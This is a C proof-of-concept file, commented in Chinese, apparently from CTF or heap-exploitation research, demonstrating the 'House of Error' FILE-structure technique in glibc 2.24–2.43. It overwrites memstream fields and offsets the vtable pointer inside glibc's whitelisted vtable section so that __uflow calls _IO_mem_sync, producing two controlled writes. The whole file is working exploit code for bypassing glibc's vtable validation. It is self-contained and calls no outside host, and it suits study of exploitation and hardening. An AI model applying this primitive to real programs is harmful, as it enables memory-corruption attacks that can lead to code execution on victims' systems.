#define _GNU_SOURCE
/*
 * House of Error 的 _IO_mem_sync 双写原语：glibc 2.24～2.43，x86-64。
 *
 * 这份微型 PoC 只证明最终触发点与合法偏移 vtable，不假装拥有题目中的
 * largebin 任意写或 stderr 劫持。它使用 open_memstream 创建真实的
 * _IO_FILE_memstream，再模拟“能覆盖 FILE 字段”的漏洞。
 *
 * 成功判据：
 *   target_pointer == controlled_buffer
 *   target_size    == 0x123
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

typedef int (*uflow_fn)(FILE *);

int main(void)
{
    setbuf(stdout, NULL);

    char *normal_buf = NULL;
    size_t normal_size = 0;
    FILE *fp = open_memstream(&normal_buf, &normal_size);
    assert(fp != NULL);

    /* x86-64 ABI：FILE(0xd8) 后是 vtable(8)、strfile 两个兼容字段，
       然后才是 memstream 的 bufloc(0xf0) 与 sizeloc(0xf8)。 */
    assert(sizeof(FILE) == 0xd8);
    void **vtable_slot = (void **)((char *)fp + sizeof(FILE));
    char ***bufloc_slot = (char ***)((char *)fp + 0xf0);
    size_t **sizeloc_slot = (size_t **)((char *)fp + 0xf8);

    void *real_mem_jumps = *vtable_slot;
    char **saved_bufloc = *bufloc_slot;
    size_t *saved_sizeloc = *sizeloc_slot;

    /* 保存本 PoC 会改的 FILE 字段，触发后恢复，保证 fclose 仍处理真实 buffer。 */
    int saved_flags = fp->_flags;
    int saved_mode = fp->_mode;
    char *saved_read_base = fp->_IO_read_base;
    char *saved_read_ptr = fp->_IO_read_ptr;
    char *saved_read_end = fp->_IO_read_end;
    char *saved_write_base = fp->_IO_write_base;
    char *saved_write_ptr = fp->_IO_write_ptr;
    char *saved_write_end = fp->_IO_write_end;

    char controlled_buffer[0x200];
    char *target_pointer = NULL;
    size_t target_size = 0;

    /* 漏洞模拟：配置 _IO_mem_sync 的两个写。
       write_ptr != write_end 可避免先走 _IO_str_overflow。 */
    fp->_IO_write_base = controlled_buffer;
    fp->_IO_write_ptr = controlled_buffer + 0x123;
    fp->_IO_write_end = controlled_buffer + 0x1ff;
    *bufloc_slot = &target_pointer;
    *sizeloc_slot = &target_size;

    /* 强制 __uflow 最后执行 vtable 的 uflow 槽。
       _IO_CURRENTLY_PUTTING=0x800；清掉它避免先切换读写模式。 */
    fp->_flags &= ~0x800;
    fp->_mode = -1;
    fp->_IO_read_base = NULL;
    fp->_IO_read_ptr = NULL;
    fp->_IO_read_end = NULL;

    /* 在 `_IO_jump_t` 函数表中，uflow 槽偏移为 0x28，sync 槽偏移为 0x60。
       real_mem_jumps + 0x38 仍在 __libc_IO_vtables 内，可通过白名单。 */
    *vtable_slot = (char *)real_mem_jumps + (0x60 - 0x28);

    uflow_fn call_uflow = (uflow_fn)dlsym(RTLD_DEFAULT, "__uflow");
    assert(call_uflow != NULL);
    int result = call_uflow(fp);

    assert(target_pointer == controlled_buffer);
    assert(target_size == 0x123);

    /* 清理：恢复真实对象，避免 fclose 把栈 buffer 当作 memstream buffer。 */
    *vtable_slot = real_mem_jumps;
    *bufloc_slot = saved_bufloc;
    *sizeloc_slot = saved_sizeloc;
    fp->_flags = saved_flags;
    fp->_mode = saved_mode;
    fp->_IO_read_base = saved_read_base;
    fp->_IO_read_ptr = saved_read_ptr;
    fp->_IO_read_end = saved_read_end;
    fp->_IO_write_base = saved_write_base;
    fp->_IO_write_ptr = saved_write_ptr;
    fp->_IO_write_end = saved_write_end;

    fclose(fp);
    free(normal_buf);
    puts("[+] Error：vtable 双写成功");
    return 0;
}
